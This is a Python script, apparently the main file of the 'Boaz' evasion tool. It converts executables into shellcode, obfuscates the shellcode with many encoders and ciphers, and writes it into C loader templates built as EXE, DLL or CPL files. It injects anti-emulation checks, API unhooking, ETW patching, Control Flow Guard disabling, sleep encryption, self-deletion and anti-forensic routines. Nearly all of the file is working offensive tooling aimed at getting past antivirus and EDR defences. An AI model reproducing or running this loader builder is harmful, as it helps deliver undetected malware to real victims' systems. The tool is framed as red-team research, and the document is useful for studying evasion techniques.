# Boaz evasion research tool main script
# Author: thomas XM
# Date 2023
#
# This file is part of the Boaz tool
# Copyright (c) 2019-2024 Thomas M
# Licensed under the GPLv3 or later.
#
import argparse
import subprocess
import os
import shutil
import re
import random
import string
import time
import glob
import sys
import hashlib


def in_docker():
    """Detect if running inside a Docker container."""
    return os.path.exists('/.dockerenv') or \
           'docker' in open('/proc/1/cgroup', 'rt').read()

# def in_docker():
#     """Detect if running inside a Docker container."""
#     if os.path.exists('/.dockerenv'):
#         return True

#     try:
#         with open('/proc/1/cgroup', 'rt', encoding='utf-8') as f:
#             return 'docker' in f.read()
#     except Exception:
#         return False


def run_cmd(cmd_list, **kwargs):
    """Run a command, stripping sudo if inside Docker."""
    if in_docker() and cmd_list[0] == 'sudo':
        cmd_list = cmd_list[1:]  # remove 'sudo'
    return subprocess.run(cmd_list, **kwargs)


def check_non_negative(value):
    ivalue = int(value)
    if ivalue < 0:
        raise argparse.ArgumentTypeError("%s is an invalid non-negative int value" % value)
    return ivalue

def generate_random_filename(length=6):
    # Generate a random string of fixed length 
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

## .bin input file
def handle_star_dust(input_file):
    if not input_file.endswith('.bin'):
        print("Warning, Stardust needs a binary shellcode file .bin as input")
        # Exit the program if the input file is not a .bin file
        sys.exit(1)
    print(f"[!] Using Stardust to generate shellcode from binary file: {input_file}")
    # Run bin_to_c_array.py to convert .bin to C array and save it to ./shellcode.txt
    subprocess.run(['python3', 'encoders/bin_to_c_array.py', input_file, './shellcode.txt'], check=True)

    # Read the generated ./shellcode.txt to find the shellcode
    with open('./shellcode.txt', 'r') as file:
        content = file.read()

    # Find the position of "unsigned char buf[] ="
    start = content.find('unsigned char buf[] =')
    if start == -1:
        print("Error: 'unsigned char buf[] =' not found in shellcode.txt")
        return

    start += len('unsigned char buf[] =')
    end = content.find(';', start)
    shellcode = content[start:end].strip()

    ## Make a copy of Stardust/src/Main.c
    # subprocess.run(['cp', 'Stardust/src/Main.c', 'Stardust/src/Main.c.bak'], check=True)
    subprocess.run(['cp', 'Stardust/src/Main.c.bak', 'Stardust/src/Main.c'], check=True)

    # Replace the placeholder ####MAGICSPELL#### in Stardust/src/Main.c
    stardust_main_path = 'Stardust/src/Main.c'
    with open(stardust_main_path, 'r') as file:
        main_content = file.read()

    if '####MAGICSPELL####' not in main_content:
        print("Error: '####MAGICSPELL####' placeholder not found in Stardust/src/Main.c")
        return

    main_content = main_content.replace('####MAGICSPELL####', shellcode)

    # Write the updated content back to Stardust/src/Main.c
    with open(stardust_main_path, 'w') as file:
        file.write(main_content)

    
    # Run `make` command in the /Stardust directory
    subprocess.run(['make', '-C', './Stardust'], check=True)

    #
    # Copy the generated boaz.x64.bin to the current directory
    subprocess.run(['cp', 'Stardust/bin/boaz.x64.bin', '.'], check=True)
    # remove ./shellcode.txt after usage:
    subprocess.run(['rm', './shellcode.txt'], check=True)   
    # copy the original backup file back to Stardust/src/Main.c
    # subprocess.run(['cp', 'Stardust/src/Main.c.bak', 'Stardust/src/Main.c'], check=True)


# TODO: 
def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, encoding=None, star_dust=False):
    if not star_dust:
        # Generate the initial shellcode .bin file
        # TODO: Add support for other shellcode types
        if shellcode_type == 'donut':
            cmd = ['./PIC/donut', '-b1', '-f1', '-i', input_exe, '-o', output_path + ".bin"]
        elif shellcode_type == 'pe2sh':
            cmd = ['wine', './PIC/pe2shc.exe', input_exe, output_path + ".bin"]
        elif shellcode_type == 'rc4':
            cmd = ['wine', './PIC/rc4_x64.exe', input_exe, output_path + ".bin", '-r']
            if subprocess.run(cmd, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
                # If rc4_x64.exe fails, try with rc4_x86.exe for 32-bit payloads
                cmd = ['wine', '/PIC/rc4_x86.exe', input_exe, output_path + ".bin", '-r']
        elif shellcode_type == 'amber':
            a_number = random.randint(1, 30)  
            # print(f"Encoding number: {a_number}")
            cmd = ['./PIC/amber', '-e', str(a_number), '--iat', '--scrape', '-f', input_exe, '-o', output_path + ".bin"]
        elif shellcode_type == 'shoggoth':
            cmd = ['wine', './PIC/shoggoth.exe', '-v', '-i', input_exe, '-o', output_path + ".bin", '--mode', 'pe']
        ####
        elif shellcode_type == 'augment':
            # 1) Dump the in-memory layout from the PE (PIC-friendly base) to a temp file
            import os
            temp_output = output_path + ".infl.tmp"
            cmd1 = ['wine', './PIC/DumpPEFromMemory.exe', input_exe, temp_output]
            r1 = subprocess.run(cmd1)
            if r1.returncode != 0:
                raise RuntimeError(f"[-] DumpPEFromMemory failed with rc={r1.returncode}")

            # 2) Generate shellcode from the dumped image using augmentedLoader.py
            final_output = output_path + ".bin"
            cmd = ['python3', './PIC/augmentedLoader.py',
                    '-f', temp_output,
                    '-e', 'false',
                    '-o', 'true',
                    '-b', final_output]

            #
        else:
            raise ValueError("[-] Unsupported shellcode type.")

        # Run the initial shellcode generation command
        # subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # run the above command but do not supress output:
        subprocess.run(cmd, check=True)
        # print the shellcode type used:
        print(f"[+] Shellcode type used: {shellcode_type}")
        # if shellcode_type == 'augment':
        #     # # cleanup temp
        #     try:
        #         os.remove(temp_output)
        #     except OSError:
        #         pass
    
    elif star_dust:
        output_path = input_exe
    # print output_path
    print(f"[+] Shellcode saved to: {output_path}")
    ### TODO: add support for stardust option: 

    # If encode flag is True, use sgn to encode the shellcode
    if encode:
        random_count = random.randint(1, 100)  # Generate a random count between 1 and 100
        encoded_output_path = output_path + "1.bin"  # Specify the encoded output file path
        encode_cmd = ['./encoders/sgn', '-a', '64', '-S', '--enc=20', '-v', '-i', output_path + ".bin", '-o', encoded_output_path]
        # encode_cmd = ['./sgn', '-a', '64', '-v', '-c', str(random_count), '-i', output_path + ".bin", '-o', encoded_output_path]
        try:
            subprocess.run(encode_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # subprocess.run(encode_cmd, check=True)
            print(f"[+] Shellcode successfully encoded with {random_count} iterations.")
            print(f"[!] Encoded shellcode saved to: {encoded_output_path}")
        except subprocess.CalledProcessError:
            print("[-] Shellcode encoding failed.")       
        output_path_bin = encoded_output_path
    else:
        # If not encoding, keep using the original .bin file
        output_path_bin = output_path + ".bin"

    if encoding:
        encoding_output_path = output_path.replace(".bin", "")
        ## TODO: Add support for other encoding types
        if encoding == 'uuid':
            cmd = ['python3', './encoders/bin2uuid.py', output_path_bin, '>', encoding_output_path]
        if encoding == 'xor':
            cmd = ['python3', './encoders/bin2xor.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'mac':
            cmd = ['python3', './encoders/bin2mac.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'ipv4':
            cmd = ['python3', './encoders/bin2ipv4.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'base45':
            cmd = ['python3', './encoders/bin2base45.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'base64':
            cmd = ['python3', './encoders/bin2base64.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'base58':
            cmd = ['python3', './encoders/bin2base58.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'aes':
            cmd = ['python3', './encoders/bin2aes.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'aes2':
            cmd = ['python3', './encoders/bin2aes.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'des':
            cmd = ['python3', './encoders/bin2des.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'chacha':
            cmd = ['python3', './encoders/bin2chacha.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'ascon':
            cmd = ['python3', './encoders/bin2ascon.py', output_path_bin, '>', encoding_output_path]
        elif encoding == 'rc4':
            cmd = ['python3', './encoders/bin2rc4.py', output_path_bin, '>', encoding_output_path]
        subprocess.run(' '.join(cmd), shell=True, check=True)
        output_path = encoding_output_path   
        print(f"[+] Shellcode encoded with {encoding} and saved to: {output_path}")
    else:
        # Process the .bin file to a C char array if not using UUID
        process_cmd = ['python3', './encoders/bin_to_c_array.py', output_path_bin, output_path]
        subprocess.run(process_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # # Process the .bin file (encoded or original) to a C char array
    # process_cmd = ['python3', 'bin_to_c_array.py', output_path_bin, output_path]
    # subprocess.run(process_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def read_shellcode(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    # Extract the shellcode from the file content
    start = content.find('unsigned char buf[] = ') + len('unsigned char buf[] = ')
    end = content.rfind(';')
    shellcode = content[start:end].strip()
    return shellcode

# def insert_junk_api_calls(content, junk_api, main_func_pattern):
#     if not junk_api:
#         return content

#     # Add the include statement at the top
#     content = '#include "normal_api.h"\n' + content

#     # Find the main function's scope
#     # main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
#     match = re.search(main_func_pattern, content, re.MULTILINE)
#     if match:
#         start_pos = match.end()
#         # Find the position of the closing brace for main
#         end_pos = content.rfind('}', start_pos)
#         if end_pos == -1:
#             end_pos = len(content)

#         # Attempt to find "safe" lines by avoiding lines immediately following an opening brace or leading into a closing brace
#         lines = content[start_pos:end_pos].split('\n')
#         safe_lines = [i for i, line in enumerate(lines) if '{' not in line and '}' not in line and line.strip() != '']

#         if safe_lines:
#             # Choose a random line index from the safe ones, avoiding first and last line
#             chosen_line_index = random.choice(safe_lines[1:-1])
#             # Construct the modified content
#             indentation = '    ' 
#             modified_line = f"{indentation}executeAPIFunction();\n{lines[chosen_line_index]}" 
#             lines[chosen_line_index] = modified_line

#             # Reconstruct the content with the inserted call
#             content = content[:start_pos] + '\n'.join(lines) + content[end_pos:]

#     return content


def insert_junk_api_calls(content, junk_api, main_func_pattern):
    if not junk_api:
        return content

    # Adding the include at the top if not already included
    if '#include "normal_api.h"' not in content:
        content = '#include "normal_api.h"\n' + content

    # Find the opening of the main function
    main_start = re.search(main_func_pattern, content, re.MULTILINE)
    if main_start:
        # Find the index just after the opening brace of the main function
        open_brace_index = content.find('{', main_start.end()) + 1
        if open_brace_index > 0:
            # Find the end of the first complete statement after the opening brace
            statement_end = content.find(';', open_brace_index)
            if statement_end > 0:
                # Insert the API call after the first complete statement
                insert_position = statement_end + 1
                content = content[:insert_position] + '\n    executeAPIFunction();\n' + content[insert_position:]

    return content



### Self_deletion function for output binaries: 
def insert_self_deletion(content):
    """Modifies the given C/C++ source code by injecting a self-deletion function after the ####END#### marker."""
    
    # Ensure the include directive is present at the top
    if '#include "self_deletion.h"' not in content:
        content = '#include "self_deletion.h"\n' + content

    # Locate the placeholder and insert `perform();` after it
    lines = content.splitlines()
    updated_lines = []
    placeholder_found = False

    for i, line in enumerate(lines):
        updated_lines.append(line)  # Add the current line as is

        # If we find the placeholder, insert `perform();` after it
        if re.search(r'//?\s*####END####', line):
            updated_lines.append('    perform();')  # Insert after, preserving indentation
            placeholder_found = True

    # Warning if the placeholder was not found
    if not placeholder_found:
        print("Warning: '####END####' placeholder not found. Appending 'perform();' at the end.")
        updated_lines.append('perform();')

    return "\n".join(updated_lines)


# Insert anti-forensic function into the template by locating the place holder ####END#### which is placed before the code exeuction. 
def insert_anti_forensic(content):
    """Insert anti_forensic() after the ####END#### marker."""
    
    # Ensure the include directive is present at the top
    if '#include "anti_forensic.h"' not in content:
        content = '#include "anti_forensic.h"\n' + content

    # Locate the placeholder and insert `anti_forensic();` after it
    lines = content.splitlines()
    updated_lines = []
    placeholder_found = False

    for i, line in enumerate(lines):
        updated_lines.append(line)  # Add the current line as is

        # If we find the placeholder, insert `anti_forensic();` after it
        if re.search(r'//?\s*####END####', line):
            updated_lines.append('    anti_forensic();')  # Insert with indentation
            placeholder_found = True

    # Warning if the placeholder was not found
    if not placeholder_found:
        print("Warning: '####END####' placeholder not found. Appending 'anti_forensic();' at the end.")
        updated_lines.append('anti_forensic();')

    return "\n".join(updated_lines)


def insert_cfg_patch(content, main_func_pattern):
    # Add the include statement for CFG patch at the top of the file
    if '#include "cfg_patch.h"' not in content:
        content = '#include "cfg_patch.h"\n' + content

    # Find the main function
    main_match = re.search(main_func_pattern, content, re.MULTILINE)
    if not main_match:
        print("Error: Main function not found.")
        return content

    # Get the portion of the content after the main function starts
    content_after_main = content[main_match.end():]

    # Find all CreateProcess and OpenProcess function calls
    create_process_matches = list(re.finditer(r'\b[A-Za-z_]*CreateProcess[A-Za-z_]*\s*\(.*?\)\s*;', content_after_main, re.DOTALL))
    open_process_matches = list(re.finditer(r'\b[A-Za-z_]*OpenProcess[A-Za-z_]*\s*\(.*?\)\s*;', content_after_main, re.DOTALL))

    # Process matches for CreateProcess and OpenProcess
    insert_positions = []
    for match in create_process_matches + open_process_matches:
        # Get the insert position after the function call (semicolon is included)
        insert_pos = match.end()

        # Find the process handle used (pi.hProcess or hProcess)
        handle_pattern = r'\bpi\.hProcess\b|\bhProcess\b'
        handle_match = re.search(handle_pattern, content_after_main[:insert_pos])

        # Determine which handle to use, or default to pi.hProcess
        process_handle = handle_match.group(0) if handle_match else "pi.hProcess"

        # Ensure valid insertion after the complete function call
        insert_positions.append((insert_pos, process_handle))

    if insert_positions:
        # Insert patchCFG() after each CreateProcess or OpenProcess
        for insert_pos, process_handle in sorted(insert_positions, reverse=True):
            # Insert patchCFG outside the function call block
            cfg_patch_code = f'\n    patchCFG({process_handle});\n    printf("[+] CFG guard disabled.\\n");\n    printf("[+] Press any key to continue\\n");\n    getchar();\n'
            content_after_main = content_after_main[:insert_pos] + cfg_patch_code + content_after_main[insert_pos:]

        # Reconstruct the content after making the insertions
        content = content[:main_match.end()] + content_after_main
    else:
        # If no CreateProcess or OpenProcess, insert at the beginning of the main function after variable declarations
        print("No CreateProcess or OpenProcess found. Inserting patchCFG(GetCurrentProcess()) at the beginning of main().")
        
        # Insert after the variable declarations in the main function
        insert_pos = content_after_main.find(';') + 1  # Insert after the first semicolon (end of first declaration)
        if insert_pos > 0:
            cfg_patch_code = '\n    patchCFG(GetCurrentProcess());\n    printf("[+] CFG guard disabled.\\n");\n    printf("[+] Press any key to continue\\n");\n    getchar();\n'
            content_after_main = content_after_main[:insert_pos] + cfg_patch_code + content_after_main[insert_pos:]
            content = content[:main_match.end()] + content_after_main
        else:
            print("Error: Failed to find valid insertion point for CFG patch.")

    return content



# def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, compile_as_exe = False, compile_as_scr = False, compile_as_sys = False, compile_as_dll = False, compile_as_drv = False, compile_as_ocx = False, compile_as_tlb = False, compile_as_tsp = False, compile_as_msc = False, compile_as_msi = False, compile_as_msp = False, compile_as_mst)
def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, star_dust = False, self_deletion=False, anti_forensic=False, cfg=False):

    # Adjust loader_template_path for DLL
    if compile_as_dll:
        loader_template_path = loader_template_path.replace('.c', '.dll.c')
        # Pattern for the DLL's entry function, need regex to replace this dumb form
        main_func_pattern = r"void CALLBACK ExecuteMagiccode\(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow\) \{"
    elif compile_as_cpl:
        loader_template_path = loader_template_path.replace('.c', '.cpl.c')
        # Pattern for the CPL's entry function
        main_func_pattern = r"LONG CALLBACK CPlApplet\(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2\) \{"
    else:
        # Pattern for the standard main function in EXE
        main_func_pattern = r"\bint\s+main\s*\([^)]*\)\s*\{"

    with open(loader_template_path, 'r') as file:
        content = file.read()


    # Insert sleep encryption if dream flag is used
    if dream_time is not None:
        # Include the sleep_encrypt header
        content = '#include "sleep_encrypt.h"\n' + content
        ### statement to indicate to user that sweet dream is being used:
        print(f"SweetDream is being used with a dream time of {dream_time/1000} seconds.\n")
        # Find the main function and insert SweetSleep call
        # main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
        match = re.search(main_func_pattern, content, re.MULTILINE)
        if match:
            insert_pos = match.end()
            newline_pos = content.find('\n', insert_pos)
            if newline_pos != -1:
                next_line_start = newline_pos + 1
                sweet_sleep_call = f'    printf("[+] Encrypting Heaps/Stacks ...\\n\\n\\n");\n    SweetSleep({dream_time});\n'
                content = content[:next_line_start] + sweet_sleep_call + content[next_line_start:]

    if (encoding is not None):
        if not star_dust:
            encoded_output_path = f'note_{shellcode_type}'  #
        elif star_dust:
            encoded_output_path = f'boaz.x64'  #
        ## TODO: Add support for other encoding types
        if encoding == 'uuid':
            include_header = '#include "uuid_converter.h"\n'
        elif encoding == 'xor':
            include_header = '#include "xor_converter.h"\n'
        elif encoding == 'mac':
            include_header = '#include "mac_converter.h"\n'
        elif encoding == 'ipv4':
            include_header = '#include "ipv4_converter.h"\n'
        elif encoding == 'base45':
            include_header = '#include "base45_converter.h"\n'
        elif encoding == 'base64':
            include_header = '#include "base64_converter.h"\n'
        elif encoding == 'base58':
            include_header = '#include "base58_converter.h"\n'
        elif encoding == 'aes':
            include_header = '#include "aes_converter.h"\n'
        elif encoding == 'aes2':
            include_header = '#include "aes2_converter.h"\n'
        elif encoding == 'des':
            include_header = '#include "des_converter.h"\n'
        elif encoding == 'chacha':
            include_header = '#include "chacha_converter.h"\n'
        elif encoding == 'ascon':
            include_header = '#include "ascon_converter.h"\n'
        elif encoding == 'rc4':
            include_header = '#include "rc4_converter.h"\n'
        else:
            # Default to uuid if not specified for backward compatibility
            include_header = '#include "uuid_converter.h"\n'
            encoding = 'uuid'

        with open(encoded_output_path, 'r') as encoded_file:
            encoded_content = encoded_file.read()

        encoded_insertion = f"\n// {encoding.upper()}s generated from magic \n" + encoded_content
        magiccode_declaration = 'unsigned char magiccode[] ='

        if magiccode_declaration in content:
            content = content.replace(magiccode_declaration, '')
        placeholder = '####SHELLCODE####'
        if placeholder in content:
            content = content.replace(placeholder, encoded_insertion)
        else:
            if compile_as_dll:
                # Find the position of the closing brace for the DLL's entry function
                # main_index = content.find('void CALLBACK ExecuteMagiccode')
                main_index = content.find('void CALLBACK ExecuteMagiccode(')
            elif compile_as_cpl:
                main_index = content.find('LONG CALLBACK CPlApplet(')
            else:
                main_index = content.find('int main')
            if main_index != -1:
                content = content[:main_index] + encoded_insertion + "\n" + content[main_index:]
            # content = content[:main_index] + encoded_insertion + "\n" + content[main_index:]

        content = include_header + content
        if compile_as_dll:
            main_func_index = content.find('void CALLBACK ExecuteMagiccode(')
        elif compile_as_cpl:
            main_func_index = content.find('LONG CALLBACK CPlApplet(')
        else:
            main_func_index = content.find('int main(')
        if main_func_index != -1:
            opening_brace_index_main = content.find('{', main_func_index) + 1

        ### TODO: 
        if encoding == 'uuid':
            encoding_declaration_index = content.find('const char* UUIDs[]')
            conversion_logic_template = """
            constexpr int numUuids = sizeof(UUIDs) / sizeof(UUIDs[0]);
            unsigned char magiccode[numUuids * 16];
            unsigned char* magiccodePtr = magiccode;
            convertUUIDsToMagicCode(UUIDs, magiccodePtr, numUuids);
            printf("[+] MagicCodePtr size: %zu bytes\\n", sizeof(magiccodePtr));
            printf("[+] size of magiccode: %zu bytes\\n", sizeof(magiccode));
            """
        elif encoding == 'xor':
            encoding_declaration_index = content.find('unsigned char XORed[]')
            conversion_logic_template = """
            size_t dataSize = sizeof(XORed) / sizeof(XORed[0]);
            unsigned char magiccode[dataSize];
            xorDecode(XORed, magiccode, dataSize, XORkey);
            printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
            printf("[+] datasize : %lu bytes\\n", dataSize);
            """
        elif encoding == 'mac':
            encoding_declaration_index = content.find('const char* MAC[]')
            conversion_logic_template = """
            constexpr int numMac = sizeof(MAC) / sizeof(MAC[0]);
            unsigned char magiccode[numMac * 6];
            unsigned char* magiccodePtr = magiccode;
            CustomEthernetStringToAddressArray(MAC, numMac, magiccode);
            printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
            printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
            """
        elif encoding == 'ipv4':
            encoding_declaration_index = content.find('const char* IPv4s[]')
            conversion_logic_template = """
        constexpr int numIpv4 = sizeof(IPv4s) / sizeof(IPv4s[0]);
        unsigned char magiccode[numIpv4 * 4];
        unsigned char* magiccodePtr = magiccode;
        convertIPv4sToMagicCode(IPv4s, magiccodePtr, numIpv4);
        printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
        """
        elif encoding == 'base45':
            encoding_declaration_index = content.find('const char base45[]')
            conversion_logic_template = """
        DWORD decodedSize = CalculateBase45DecodedSize(base45);
        unsigned char magiccode[decodedSize];
        unsigned char* magiccodePtr = magiccode;
        if (CustomBase45ToBinary(base45, strlen(base45), magiccodePtr, &decodedSize)) {
            printf("Failed to decode base45 string\\n");
        }
        printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
        """
        elif encoding == 'base64':
            encoding_declaration_index = content.find('const char base64[]')
            conversion_logic_template = """
        DWORD decodedSize = CalculateDecodedSize(base64);
        unsigned char magiccode[decodedSize];
        unsigned char* magiccodePtr = magiccode;
        if (!CustomCryptStringToBinaryA(base64, strlen(base64), magiccodePtr, &decodedSize)) {
            printf("Failed to decode base64 string\\n");
        }
        printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
        """
        elif encoding == 'base58':
            encoding_declaration_index = content.find('const char base58[]')
            conversion_logic_template = """
        DWORD decodedSize = CalculateDecodedSizeBase58(base58);
        unsigned char magiccode[decodedSize];
        unsigned char* magiccodePtr = magiccode;
        if (!CustomCryptStringToBinaryA(base58, strlen(base58), magiccodePtr, &decodedSize)) {
            printf("Failed to decode base58 string\\n");
        }
        printf("[+] MagicCodePtr size: %lu bytes\\n", sizeof(magiccodePtr));
        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
        """
        elif encoding == 'aes':
            encoding_declaration_index = content.find('unsigned char magiccode[]') 
            conversion_logic_template = """
        DWORD aes_length = sizeof(magiccode);

        DecryptAES((char*)magiccode, aes_length, AESkey, sizeof(AESkey));

        printf("[+] size of magiccode: %lu bytes\\n", sizeof(magiccode));
        """
        elif encoding == 'des':
            encoding_declaration_index = content.find('unsigned char magic_code[]')
            conversion_logic_template = """
            size_t magic_len = sizeof(magic_code);
            unsigned char magiccode[magic_len];
            int result_des = des_magic(magic_code, magic_len, magiccode);
        """
        elif encoding == 'chacha':
            encoding_declaration_index = content.find('unsigned char magic_code[]')
            conversion_logic_template = """
    int lenMagicCode = sizeof(magic_code);

    unsigned char magiccode[lenMagicCode];

    test_decryption();

    chacha20_encrypt(magiccode, magic_code, lenMagicCode, CHACHA20key, CHACHA20nonce, 1);

    // print_decrypted_result(magiccode, lenMagicCode);
    printf("\\n");
        """
        elif encoding == 'rc4':
            encoding_declaration_index = content.find('unsigned char magiccode[]')
            conversion_logic_template = """
        //unsigned char magiccode[sizeof(magic_code)];
        //memcpy(magiccode, magic_code, sizeof(magic_code));

        const char sysfunc32Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', 0 };
        const char advdll[] = { 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0 };
        initialize_keys();
        initialize_data((unsigned char*)magiccode, sizeof(magiccode));
        
        sysfunc32 = (SystemFunction032_t)GetProcAddress(LoadLibrary(advdll), sysfunc32Char);
        NTSTATUS eny = sysfunc32(&pData, &pKey);
  
        if(eny != STATUS_SUCCESS) {
            printf("[-] sysfunc32 failed to decrypt the data. Status: %x\\n", eny);
        } else {
            printf("[+] sysfunc32 succeeded to decrypt the data.\\n");
        }

        // sanity check
        // Print first and last 10 bytes of magiccode
        printf("magiccode (first 10 bytes): ");
        for (int i = 0; i < 10; i++) {
            printf("%02X ", ((unsigned char*)pData.Buffer)[i]);
        }
        printf("\\n");

        printf("magiccode (last 10 bytes): ");
        for (int i = (pData.Length - 10); i < pData.Length; i++) {
            printf("%02X ", ((unsigned char*)pData.Buffer)[i]);
        }
        printf("\\n");

        """
        elif encoding == 'ascon':
            encoding_declaration_index = content.find('unsigned char magic_code[]')
            conversion_logic_template = """
    SIZE_T lenMagicCode = sizeof(magic_code);
    unsigned char magiccode[lenMagicCode];

    cast6_decrypt(magic_code, lenMagicCode, CAST6key, magiccode);

    print_hex("magic code:", magiccode, lenMagicCode);

    printf("\\n");
        """
        elif encoding == 'aes2':
            encoding_declaration_index = content.find('unsigned char magiccode[]') 
            conversion_logic_template = (
                "        DWORD aes_length = sizeof(magiccode);\n"
                "        unsigned int half_length = aes_length / 2; \n"
                "        int sifu = 2897;\n"
                "        int ninja = 7987;\n"
                "        for (int i = 0; i < 100000000; i++) {\n"
                "            if(ninja == 7987 && i == 99527491 && sifu != 7987) {\n"
                "                    printf(\"[+] Sifu is not happy! \\n\");\n"
                "                    printf(\"Fibonacci number at position %d is %lld\\n\", 45, fibonacci(45));\n"
                "                    DecryptAES((char*)magiccode, half_length, AESkey, sizeof(AESkey));\n"
                "                }\n"
                "            \n"
                "            if(ninja != 2897 && i == 99527491 && sifu == 2897){\n"
                "                printFactorial(20);\n"
                "                printf(\"[+] Ninja is going to perform ninjutsu! \\n\");\n"
                "                HANDLE mutex;\n"
                "                mutex = CreateMutex(NULL, TRUE, \"muuuutttteeexxx\");\n"
                "                if (GetLastError() == ERROR_ALREADY_EXISTS) {\n"
                "                    DecryptAES((char*)(magiccode + half_length), half_length, AESkey, sizeof(AESkey));\n"
                "                    printf(\"Mutex already exists. \\n\");\n"
                "                } else {\n"
                "                    printf(\"Mutex does not exist. \\n\");\n"
                "                    startExe(\"" + file_name + "\");\n"
                "                    Sleep(100);\n"
                "                }\n"
                "                \n"
                "            }\n"
                "        }\n")

        if encoding_declaration_index != -1 and (encoding_declaration_index < main_func_index or main_func_index == -1):
            pass  # Placeholder for any specific logic when encoding declarations are outside main

        if encoding_declaration_index > main_func_index and main_func_index != -1:
            if encoding == 'base64' or encoding == 'base58':
                closing_brace_index = content.find('";', encoding_declaration_index) + 1
            else:
                closing_brace_index = content.find('};', encoding_declaration_index) + 1
            insertion_point = content.find('\n', closing_brace_index) + 1
        else:
            insertion_point = opening_brace_index_main if main_func_index != -1 else -1

        if insertion_point != -1:
            content = content[:insertion_point] + conversion_logic_template + content[insertion_point:]
        else:
            print("Error: Appropriate insertion place not found.")


    # Insert API unhooking if the flag is set
    if api_unhooking:
        # Ensure #include "api_untangle.h" is added at the top of the file
        content = '#include "api_untangle.h"\n' + content
        # Insert ExecuteModifications at the beginning of the main function
        # main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
        match = re.search(main_func_pattern, content, re.MULTILINE)
        if match:
            insert_pos = match.end()
            newline_pos = content.find('\n', insert_pos)
            if newline_pos != -1:
                next_line_start = newline_pos + 1
                indentation = '    '  
                execute_modifications_call = f"{indentation}ExecuteModifications(argc, argv);\n"
                content = content[:next_line_start] + execute_modifications_call + content[next_line_start:]

    # Insert junk API calls if the flag is set
    content = insert_junk_api_calls(content, junk_api, main_func_pattern)

    # Replace the placeholder with the actual shellcode
    if (encoding is None):
        content = content.replace('####SHELLCODE####', shellcode)


    # Check if -cfg flag is provided to disable CFG
    if cfg:
        print("[+] Control Flow Guard (CFG) disabling is enabled.\n")
        content = insert_cfg_patch(content, main_func_pattern)

    if anti_emulation:
        content = '#include "anti_emu.h"\n' + content

# ETW patching functionality
    if etw:
        # Include the ETW patch header at the top
        content = '#include "etw_pass.h"\n' + content
        # Find the appropriate place to insert the ETW patch code, insert after the call to `executeAllChecksAndEvaluate();`
        # main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
        match = re.search(main_func_pattern, content, re.MULTILINE)
        if match:
            insert_pos = content.find('executeAllChecksAndEvaluate();', match.end())
            if insert_pos != -1:
                insert_pos += len('executeAllChecksAndEvaluate();') + 1
            else:
                # If specific call to `executeAllChecksAndEvaluate();` not found, just insert after opening brace of main
                insert_pos = match.end() + 1
            
            etw_patch_code = '''
        if (everyThing() == EXIT_SUCCESS) {
            printf("\\n[+] ETW Patched Successfully...\\n");
        } else {
            printf("\\n[-] ETW Patch Failed...\\n");
        }
    '''
            # Insert the ETW patch code at the determined position
            content = content[:insert_pos] + etw_patch_code + content[insert_pos:]

    if god_speed:
        content = '#include "god_speed.h"\n' + content

    # main_func_pattern = r'\bint\s+main\s*\([^)]*\)\s*\{'
    match = re.search(main_func_pattern, content, re.MULTILINE)
    if match:
        insert_pos = match.end()
        newline_pos = content.find('\n', insert_pos)
        if newline_pos != -1:
            next_line_start = newline_pos + 1
            indentation_match = re.match(r'\s*', content[next_line_start:])
            indentation = indentation_match.group(0) if indentation_match else ''
            function_calls = ''
            if anti_emulation:
                ## TODO: add file name to check: 
                # function_calls += f"{indentation}executeAllChecksAndEvaluate();\n"
                # either compile_as_dll or compile_as_cpl is true, then we need to pass the file name to the function
                if compile_as_dll or compile_as_cpl:
                    function_call = f"executeAllChecksAndEvaluate();"
                else:
                    function_call = f"executeAllChecksAndEvaluate(\"{file_name}\", argv[0]);" if file_name is not None else "executeAllChecksAndEvaluate();"
                function_calls += f"{indentation}{function_call}\n"
